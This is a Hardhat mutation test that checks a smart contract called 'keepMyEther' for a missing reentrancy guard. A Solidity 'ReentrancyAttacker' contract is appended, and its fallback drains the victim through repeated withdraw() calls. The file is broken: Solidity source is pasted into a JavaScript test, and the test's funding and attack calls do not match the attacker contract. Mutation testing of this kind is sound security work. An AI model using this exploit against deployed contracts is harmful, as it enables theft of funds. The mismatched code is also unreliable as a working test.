import { expect } from "chai";
import { ethers } from "hardhat";

describe("keepMyEther mutant test - reentrancy detection", function () {
  it("should detect missing reentrancy guard by performing a reentrancy attack", async function () {
    const [owner, attacker] = await ethers.getSigners();
    
    // Deploy the vulnerable contract (mutant without __lock_modifier0)
    const Factory = await ethers.getContractFactory("keepMyEther");
    const instance = await Factory.deploy();
    await instance.waitForDeployment();
    
    // Deploy attacker contract that will perform reentrancy
    const AttackerFactory = await ethers.getContractFactory("ReentrancyAttacker");
    const attackerContract = await AttackerFactory.deploy(instance.target);
    await attackerContract.waitForDeployment();
    
    // Fund the victim contract with some ether
    await owner.sendTransaction({
      to: instance.target,
      value: ethers.parseEther("10")
    });
    
    // Fund the attacker contract with ether to trigger the attack
    await attacker.sendTransaction({
      to: attackerContract.target,
      value: ethers.parseEther("5")
    });
    
    // Get initial balance of attacker contract
    const initialBalance = await ethers.provider.getBalance(attackerContract.target);
    
    // Perform the attack - this should drain more than the actual balance if reentrancy works
    await attackerContract.connect(attacker).attack({ gasLimit: 3000000 });
    
    // Get final balance of attacker contract
    const finalBalance = await ethers.provider.getBalance(attackerContract.target);
    
    // In the original contract with reentrancy guard, the attacker could only withdraw once
    // In the mutant without guard, the attacker can drain the entire contract balance
    // The attack should have taken more than the initial 5 ETH (the attacker's deposit)
    // If reentrancy succeeded, the attacker contract balance should be significantly higher
    expect(finalBalance).to.be.gt(initialBalance + ethers.parseEther("5"));
    
    // Also verify the victim contract is drained (or significantly reduced)
    const victimBalance = await ethers.provider.getBalance(instance.target);
    expect(victimBalance).to.be.lt(ethers.parseEther("5"));
  });
});

// Reentrancy attacker contract
contract ReentrancyAttacker {
    address public victim;
    uint256 public attackCount;
    
    constructor(address _victim) {
        victim = _victim;
    }
    
    function attack() external payable {
        // First deposit some ether to have balance
        // Then call withdraw which will trigger fallback
        (bool sent, ) = victim.call{value: msg.value}("");
        require(sent, "Failed to send ether");
        
        // Now call withdraw - this will trigger the reentrancy
        (bool success, ) = victim.call(abi.encodeWithSignature("withdraw()"));
        require(success, "Withdraw failed");
    }
    
    fallback() external payable {
        if (attackCount < 5) { // Limit reentrancy depth
            attackCount++;
            // Try to withdraw again before balance is updated
            (bool success, ) = victim.call(abi.encodeWithSignature("withdraw()"));
            require(success, "Reentrancy withdraw failed");
        }
    }
}